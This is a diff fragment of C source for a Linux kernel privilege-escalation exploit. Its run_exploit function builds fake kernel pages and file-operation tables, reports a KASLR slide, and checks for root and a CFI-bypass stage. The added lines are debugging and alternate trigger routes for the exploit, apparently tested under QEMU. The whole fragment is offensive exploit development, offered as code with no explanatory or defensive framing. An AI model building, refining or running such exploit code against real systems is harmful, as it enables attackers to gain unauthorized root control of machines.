@@ -472,6 +472,21 @@ int run_exploit(int argc, char **argv) {
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
 #endif
 
+#if defined(SHELL_PERF_PAGE_ORACLE) && SHELL_PERF_PAGE_ORACLE
+  if (getenv("PAGE_ONLY")) {
+    pr_success("shell page-only done base=%016zx lock=%016zx fops=%016zx "
+               "task=%016zx scratch=%016zx\n",
+               page_base, fake_lock, fake_fops, fake_task, binwrite_target);
+    return page_base ? 0 : 1;
+  }
+#endif
+
+#ifdef QEMU_GDB_HOLD_SECONDS
+  pr_info("qemu gdb hold seconds=%d base=%016zx\n",
+          QEMU_GDB_HOLD_SECONDS, page_base);
+  sleep(QEMU_GDB_HOLD_SECONDS);
+#endif
+
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (!page_base) {
     return 1;
@@ -595,7 +610,14 @@ int run_exploit(int argc, char **argv) {
 #endif
 #endif
 #else
+#if defined(SHELL_STACK_WRITER) && SHELL_STACK_WRITER
+  int triggered = shell_trigger_fops_stack_route();
+  int verified = triggered && try_cfi_stage();
+  pr_info("shell fops stack triggered=%d verified=%d step=%d errno=%d\n",
+          triggered, verified, cfi_last_step, cfi_last_errno);
+#else
   run_main_route_threads();
+#endif
 #endif
 
   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
@@ -610,11 +632,15 @@ int run_exploit(int argc, char **argv) {
     SYSCHK(kill(pipe_prepare_child, SIGKILL));
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
+#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
+  int exploit_ok = atomic_load(&cfi_stage_done);
+#else
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
   if (exploit_ok) {
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
   }
+#endif
   return exploit_ok ? 0 : 1;
 }
